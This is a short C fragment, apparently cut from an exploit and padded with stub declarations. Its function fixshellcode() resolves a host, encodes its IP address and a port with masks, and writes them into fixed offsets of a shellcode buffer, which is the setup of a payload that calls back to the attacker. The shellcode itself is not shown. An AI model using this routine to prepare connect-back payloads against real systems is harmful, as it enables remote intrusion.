
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct hostent {char* h_addr; int h_length; } ;
typedef char port ;
typedef char ip ;


 char* code ;
 int exit (int ) ;
 int findvalmask (char*,char*,int) ;
 struct hostent* gethostbyname (char*) ;
 unsigned long inet_addr (char*) ;
 int memcpy (char*,char*,int) ;
 int printf (char*) ;

void fixshellcode(char *host, unsigned short port) {
 unsigned long ip;
 char abuf[4],amask[4],pbuf[2],pmask[2];
 if ((ip = inet_addr(host)) == -1) {
  struct hostent *hostm;
  if ((hostm=gethostbyname(host)) == ((void*)0)) {
   printf("Unable to resolve local address\n");
   exit(0);
  }
  memcpy((char*)&ip, hostm->h_addr, hostm->h_length);
 }
 abuf[3]=(ip>>24)&0xff;
 abuf[2]=(ip>>16)&0xff;
 abuf[1]=(ip>>8)&0xff;
 abuf[0]=(ip)&0xff;
 pbuf[0]=(port>>8)&0xff;
 pbuf[1]=(port)&0xff;
 findvalmask(abuf,amask,4);
 findvalmask(pbuf,pmask,2);
 memcpy(&code[33],abuf,4);
 memcpy(&code[38],amask,4);
 memcpy(&code[48],pbuf,2);
 memcpy(&code[53],pmask,2);
}
